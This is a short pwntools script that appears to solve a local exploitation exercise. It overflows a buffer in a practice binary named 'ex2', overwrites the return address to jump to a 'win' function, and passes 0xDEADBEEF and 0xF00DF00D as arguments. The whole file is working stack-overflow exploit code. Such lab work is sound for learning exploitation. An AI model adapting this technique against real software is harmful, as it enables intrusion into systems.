from pwn import *

payload = b'A' * 99 
address = p32(0x080491db)
deadbeef = p32(0xDEADBEEF)
food = p32(0xF00DF00D)
main_address = p32(0x08049269)
p = process("/home/raz/git/cyber/Exploitation/ex2_folder/ex2")
recv_data = p.recvuntil(b'Please enter your string:')
print(recv_data)
#sending payload of 99 max of buff ,adding 13 chars of null for go to change return address , set return address to win+5 for going where esp = ebp , add 8 nulls for going ebp+8 and set for deadbeef and set food to F00DF00D
#gdb.attach(p,)
p.sendline(payload + b'\x00'*13 + address + b'\x00' * 4 +main_address + deadbeef + food)
#p.interactive()
#print(payload + b'\x00' * 13 + address + b'\x00'*8 + deadbeef + food)
recv_data = p.recvuntil(b'Well done.\n')
print(recv_data)
p.interactive()
